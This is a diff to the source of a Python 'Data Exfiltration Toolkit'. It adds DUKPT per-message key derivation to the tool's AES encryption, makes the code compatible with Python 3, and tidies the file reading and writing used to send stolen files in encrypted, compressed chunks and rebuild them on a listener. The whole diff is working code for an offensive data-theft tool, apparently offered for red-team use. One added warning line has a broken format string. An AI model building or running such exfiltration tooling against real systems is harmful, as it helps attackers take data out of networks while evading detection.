@@ -1,3 +1,4 @@
+from __future__ import print_function
 import os
 import random
 import threading
@@ -15,7 +16,12 @@ from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
-from cStringIO import StringIO
+from plugins import dukpt
+
+try:
+    from cStringIO import StringIO
+except ImportError:
+    from io import StringIO
 
 if getattr(sys, 'frozen', False):
     os.chdir(sys._MEIPASS)
@@ -29,7 +35,8 @@ COMPRESSION    = True
 files = {}
 threads = []
 config = None
-
+dukpt_client = None
+dukpt_server = None
 
 class bcolors:
     HEADER = '\033[95m'
@@ -43,7 +50,7 @@ class bcolors:
 
 
 def display_message(message):
-    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)
+    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))
 
 
 def warning(message):
@@ -61,6 +68,12 @@ def info(message):
 # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
 def aes_encrypt(message, key=KEY):
     try:
+        ksn = ""
+        # If using DUKPT, generate a new key
+        if dukpt_client:
+            info = dukpt_client.gen_key()
+            key = info['key']
+            ksn = info['ksn']
         # Generate random CBC IV
         iv = os.urandom(AES.block_size)
 
@@ -71,7 +84,7 @@ def aes_encrypt(message, key=KEY):
         pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
 
         # Return data size, iv and encrypted message
-        return iv + aes.encrypt(pad(message))
+        return iv + ksn + aes.encrypt(pad(message))
     except:
         return None
 
@@ -79,7 +92,12 @@ def aes_decrypt(message, key=KEY):
     try:
         # Retrieve CBC IV
         iv = message[:AES.block_size]
-        message = message[AES.block_size:]
+        if dukpt_server:
+            ksn = message[AES.block_size:AES.block_size+dukpt_server.KSN_LEN]
+            message = message[AES.block_size+dukpt_server.KSN_LEN:]
+            key = dukpt_server.gen_key(ksn)
+        else:
+            message = message[AES.block_size:]
 
         # Derive AES key from passphrase
         aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
@@ -200,13 +218,18 @@ class Exfiltration(object):
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
-        f = open(filename, 'w')
-        f.write(content)
-        f.close()
+        try:
+            with open(filename, 'w') as f:
+                f.write(content)
+        except IOError as e:
+            warning("Got %s: cannot save file %s" % filename)
+            raise e
+
         if (files[jobid]['checksum'] == md5(open(filename))):
             ok("File %s recovered" % (fname))
         else:
             warning("File %s corrupt!" % (fname))
+
         del files[jobid]
 
     def retrieve_data(self, data):
@@ -261,7 +284,8 @@ class ExfiltrateFile(threading.Thread):
             buf = StringIO(file_content)
             e = StringIO(file_content)
         else:
-            file_content = open(self.file_to_send, 'rb').read()
+            with open(self.file_to_send, 'rb') as f:
+                file_content = f.read()
             buf = StringIO(file_content)
             e = StringIO(file_content)
         self.checksum = md5(buf)
@@ -324,6 +348,7 @@ def signal_handler(bla, frame):
 def main():
     global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
     global threads, config
+    global dukpt_client, dukpt_server
 
     parser = argparse.ArgumentParser(
         description='Data Exfiltration Toolkit (@PaulWebSec)')
@@ -345,7 +370,7 @@ def main():
     results = parser.parse_args()
 
     if (results.config is None):
-        print "Specify a configuration file!"
+        print("Specify a configuration file!")
         parser.print_help()
         sys.exit(-1)
 
@@ -361,7 +386,15 @@ def main():
     MIN_BYTES_READ = int(config['min_bytes_read'])
     MAX_BYTES_READ = int(config['max_bytes_read'])
     COMPRESSION    = bool(config['compression'])
-    KEY = config['AES_KEY']
+    if 'IPEK' in config:
+        IPEK = config['IPEK']
+        KSN  = config['KSN']
+        dukpt_client = dukpt.Client(IPEK.decode('hex'), KSN.decode('hex'))
+    elif 'BDK' in config:
+        BDK  = config['BDK']
+        dukpt_server = dukpt.Server(BDK.decode('hex'))
+    else:
+        KEY  = config['AES_KEY']
     app = Exfiltration(results, KEY)
 
     # LISTEN/PROXY MODE
